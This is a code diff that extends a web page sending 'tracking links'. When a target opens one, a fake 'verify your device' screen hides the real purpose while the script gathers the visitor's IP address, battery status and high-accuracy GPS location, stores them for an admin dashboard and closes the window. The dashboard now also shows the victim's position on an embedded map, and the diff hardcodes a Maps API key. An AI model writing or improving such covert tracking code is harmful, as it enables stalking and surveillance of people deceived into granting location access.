@@ -446,6 +446,43 @@
             word-break: break-all;
         }
         
+        /* Target Page Styles */
+        .target-page {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            transition: all 0.3s;
+        }
+        
+        .target-content {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 12px;
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+        }
+        
+        .target-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        .target-message {
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+        
         /* Responsive */
         @media (max-width: 768px) {
             .auth-card {
@@ -464,6 +501,10 @@
             .data-table {
                 display: block;
                 overflow-x: auto;
+            }
+            
+            .target-content {
+                padding: 20px;
             }
         }
     </style>
@@ -591,6 +632,15 @@
             </div>
         </div>
     </div>
+    
+    <!-- Target Page Content (shown when someone opens tracking link) -->
+    <div id="targetPage" class="target-page" style="display: none;">
+        <div class="target-content">
+            <div class="target-spinner"></div>
+            <div class="target-message" id="targetMessage">Collecting device information...</div>
+            <p>Please wait while we verify your device</p>
+        </div>
+    </div>
 
     <script>
         // Admin credentials (in a real app, this would be server-side)
@@ -607,7 +657,12 @@
         const trackingId = urlParams.get('track');
         
         if (trackingId) {
-            // This is a tracking link - collect device info
+            // Hide all other content and show target page
+            document.getElementById('loginSection').style.display = 'none';
+            document.getElementById('appContent').style.display = 'none';
+            document.getElementById('targetPage').style.display = 'flex';
+            
+            // Start collecting device info
             collectDeviceInfo(trackingId);
         }
         
@@ -711,7 +766,12 @@
             }, 2000);
         }
         
-        function collectDeviceInfo(trackingId) {
+        // Enhanced device info collection with Promise.all
+        async function collectDeviceInfo(trackingId) {
+            // Update target message
+            document.getElementById('targetMessage').textContent = "Collecting device information...";
+            
+            // Prepare basic device info
             const deviceInfo = {
                 id: 'device-' + Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
                 trackingId: trackingId,
@@ -730,47 +790,84 @@
                 location: null
             };
             
-            // Get IP address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    deviceInfo.ipAddress = data.ip;
-                    saveDeviceInfo(deviceInfo);
-                })
-                .catch(() => {
-                    saveDeviceInfo(deviceInfo);
+            try {
+                // Create promises for all async operations
+                const ipPromise = fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        deviceInfo.ipAddress = data.ip;
+                    })
+                    .catch(() => {
+                        deviceInfo.ipAddress = 'Unknown';
+                    });
+                
+                const batteryPromise = ('getBattery' in navigator) ? 
+                    navigator.getBattery().then(battery => {
+                        deviceInfo.batteryLevel = (battery.level * 100) + '%';
+                        deviceInfo.batteryStatus = battery.charging ? "Charging" : "Not charging";
+                    }).catch(() => {}) : 
+                    Promise.resolve();
+                
+                // Enhanced location detection with better feedback
+                const locationPromise = new Promise((resolve) => {
+                    if ('geolocation' in navigator) {
+                        document.getElementById('targetMessage').textContent = "Requesting location permission...";
+                        
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                deviceInfo.location = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    accuracy: position.coords.accuracy
+                                };
+                                document.getElementById('targetMessage').textContent = "Location received!";
+                                resolve();
+                            },
+                            error => {
+                                let errorMessage = "Location access denied";
+                                switch(error.code) {
+                                    case error.PERMISSION_DENIED:
+                                        errorMessage = "Location permission denied";
+                                        break;
+                                    case error.POSITION_UNAVAILABLE:
+                                        errorMessage = "Location unavailable";
+                                        break;
+                                    case error.TIMEOUT:
+                                        errorMessage = "Location request timed out";
+                                        break;
+                                }
+                                document.getElementById('targetMessage').textContent = errorMessage;
+                                resolve();
+                            },
+                            { 
+                                maximumAge: 60000, 
+                                timeout: 10000,
+                                enableHighAccuracy: true 
+                            }
+                        );
+                    } else {
+                        document.getElementById('targetMessage').textContent = "Geolocation not supported";
+                        resolve();
+                    }
                 });
-            
-            // Get battery status if available
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(function(battery) {
-                    deviceInfo.batteryLevel = (battery.level * 100) + '%';
-                    deviceInfo.batteryStatus = battery.charging ? "Charging" : "Not charging";
-                    saveDeviceInfo(deviceInfo);
-                }).catch(() => {
-                    saveDeviceInfo(deviceInfo);
-                });
-            } else {
+                
+                // Wait for all data to be collected (max 10 seconds)
+                await Promise.all([
+                    ipPromise,
+                    batteryPromise,
+                    locationPromise,
+                    new Promise(resolve => setTimeout(resolve, 2000)) // Minimum delay
+                ]);
+                
+                // Update target message
+                document.getElementById('targetMessage').textContent = "Saving information...";
+                
+                // Save the complete device info
                 saveDeviceInfo(deviceInfo);
-            }
-            
-            // Get location if permitted
-            if ('geolocation' in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        deviceInfo.location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        saveDeviceInfo(deviceInfo);
-                    },
-                    function() {
-                        saveDeviceInfo(deviceInfo);
-                    },
-                    { maximumAge: 60000, timeout: 5000 }
-                );
-            } else {
+            } catch (error) {
+                console.error("Error collecting device info:", error);
+                document.getElementById('targetMessage').textContent = "Error collecting information";
+                // Save whatever we have if there's an error
                 saveDeviceInfo(deviceInfo);
             }
         }
@@ -781,17 +878,13 @@
             collectedDevices.push(deviceInfo);
             localStorage.setItem('collectedDevices', JSON.stringify(collectedDevices));
             
-            // Show a message to the target
-            document.body.innerHTML = `
-                <div style="text-align: center; padding: 50px;">
-                    <h2>Thank You</h2>
-                    <p>This page will close automatically...</p>
-                </div>
-            `;
+            // Show completion message to target
+            document.getElementById('targetMessage').textContent = "Complete! Closing window...";
             
+            // Close the window after a short delay
             setTimeout(() => {
                 window.close();
-            }, 2000);
+            }, 1500);
         }
         
         function loadDashboard() {
@@ -951,6 +1044,19 @@
                             </a>
                         </div>
                     </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Map Preview</div>
+                        <div class="detail-value">
+                            <iframe 
+                                width="100%" 
+                                height="300" 
+                                frameborder="0" 
+                                style="border:0"
+                                src="https://www.google.com/maps/embed/v1/view?key=AIzaSyD5ES8epSiGdJ9YpzZ-_YJ-7yK39ZpgXq0&center=${device.location.latitude},${device.location.longitude}&zoom=15&maptype=roadmap" 
+                                allowfullscreen>
+                            </iframe>
+                        </div>
+                    </div>
                 `;
             }
             
@@ -991,4 +1097,4 @@
         }
     </script>
 </body>
-</html>
+    </html>
